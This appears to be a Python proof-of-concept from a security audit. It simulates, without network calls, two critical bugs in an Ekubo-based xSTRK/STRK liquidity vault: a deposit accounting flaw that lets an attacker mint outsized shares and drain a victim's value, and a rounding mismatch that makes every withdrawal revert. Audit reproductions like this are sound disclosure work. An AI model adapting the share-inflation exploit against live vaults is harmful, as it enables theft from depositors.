"""Consolidated reproductions for the CRITICAL findings (no RPC)."""
from ekubo_math import SCALE_18, max_liquidity, liq_delta_to_amount_delta, TWO128, compute_fee
from cl_vault_poc import PoolCfg, Ekubo, Vault
FEE_01=34028236692093847977029636859101184
XSTRK,STRK='xSTRK','STRK'
def mk(wf, decimals=(18,18)):
    ek=Ekubo([PoolCfg(XSTRK,STRK,decimals[0],decimals[1],FEE_01,200,104000,124000,114000)],wf)
    return Vault(ek,SCALE_18,SCALE_18),ek
def seed(v,who,t0,t1):
    v.bal[(who,XSTRK)]=v.bal.get((who,XSTRK),0)+t0
    v.bal[(who,STRK)]=v.bal.get((who,STRK),0)+t1
def rb(v,ek):
    L=max_liquidity(ek.pools[0].price,ek.pools[0].lo,ek.pools[0].hi,v.free[XSTRK],v.free[STRK]); v.rebalance([L]); return L

print("#"*104)
print("# F1: _process_deposit uses vault_level_positions for the transferFrom but mints from caller amounts")
print("#"*104)
TVL=200_000*10**18
for K in (1,10,1000,10**6,10**9):
    v,ek=mk(True); seed(v,'victim',TVL,TVL); v.deposit('victim',TVL,TVL,'victim'); rb(v,ek)
    P0,P1,liq=ek.token_info(0)
    _,_,vp,_,_=v.convert_to_shares(K*P0,K*P1); need0,need1=sum(x[1] for x in vp),sum(x[2] for x in vp)
    seed(v,'attacker',need0,need1)
    m=v.deposit('attacker',K*P0,K*P1,'attacker')
    v2,ek2=mk(True); seed(v2,'victim',TVL,TVL); v2.deposit('victim',TVL,TVL,'victim')
    victim_shares_before=v2.shares['victim']
    print(f" K={K:<11} cost {need0/1e18:>12.4f}+{need1/1e18:>12.4f}  ->  {m/(v.supply-m):>12.6f} x of the PREDEPOSIT supply "
          f"(victim keeps {1/(1+m/(v.supply-m)):.8%})")

print("\n# attacker exits on historical Core (withdrawal fee still charged -> withdraw() works)")
v,ek=mk(True); seed(v,'victim',TVL,TVL); v.deposit('victim',TVL,TVL,'victim'); rb(v,ek)
P0,P1,liq=ek.token_info(0); K=10**6
_,_,vp,_,_=v.convert_to_shares(K*P0,K*P1); need0,need1=sum(x[1] for x in vp),sum(x[2] for x in vp)
seed(v,'attacker',need0,need1); m=v.deposit('attacker',K*P0,K*P1,'attacker')
out=v.withdraw('attacker',m,'attacker'); g0,g1=sum(x[0] for x in out),sum(x[1] for x in out)
print(f" victim TVL          : {TVL/1e18:,.6f} + {TVL/1e18:,.6f}")
print(f" vault position      : {P0/1e18:,.6f} xSTRK + {P1/1e18:,.6f} STRK")
print(f" attacker cost       : {need0/1e18:,.6f} xSTRK + {need1/1e18:,.6f} STRK")
print(f" attacker receives   : {g0/1e18:,.6f} xSTRK + {g1/1e18:,.6f} STRK")
print(f" NET PROFIT          : {(g0-need0)/1e18:,.6f} xSTRK + {(g1-need1)/1e18:,.6f} STRK  "
      f"= {((g0+g1)/(need0+need1)-1)*100:.4f}%")
print(f" victim keeps        : {v.shares['victim']/v.supply:.8%} of the vault")

print("\n"+"#"*104)
print("# F2: withdraw() demands amount_i*999900/1e6-1 but Ekubo pays floor(amount_i) -> every redeem reverts")
print("#"*104)
for wf,label in ((False,"current Core >= 47e9b24"),(True,"historical Core 4a2e3ea")):
    print(f"-- {label}")
    for TVL in (10**21, 10**24):
        v,ek=mk(wf); seed(v,'victim',TVL,TVL); s=v.deposit('victim',TVL,TVL,'victim'); rb(v,ek)
        pos=v.convert_to_assets(s)
        pf=1000000-(FEE_01*1000000//TWO128)
        exp=(pos[0][1]*pf//1000000-1) if pos[0][1]>0 else 0
        d=liq_delta_to_amount_delta(ek.pools[0].price,pos[0][0],True,ek.pools[0].lo,ek.pools[0].hi)[0]
        pay=d-(compute_fee(d,FEE_01) if wf else 0)
        tag = "OK" if pay==exp else "REVERT"
        print(f"   TVL={TVL/1e18:>10,.0f}  position.amount0={pos[0][1]:<26} ekubo_pays={pay:<26} vault_expects={exp:<26} -> {tag}")
